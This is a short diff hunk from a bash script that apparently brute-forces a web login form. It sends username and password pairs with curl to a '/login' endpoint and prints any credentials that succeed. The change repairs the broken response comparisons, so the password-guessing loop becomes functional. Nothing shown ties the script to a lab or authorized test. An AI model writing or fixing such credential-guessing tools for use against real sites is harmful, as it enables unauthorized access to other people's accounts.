@@ -93,10 +93,10 @@ begin(){
 
 		response=$(curl -X Post "$url/login" -d "username=$user&password=$pass")
 
-		if [[ "*fail*" == "*response*" ]]; then 
+		if [[ "$response" == *fail* ]]; then 
 
 			echo "[-] Trying: $pass"
-		elif [[ "*success*" == "response" ]]; then
+		elif [[ "$response" == *success* ]]; then
 
 			echo "[+] FOUND → $user:$pass"
 			exit 1
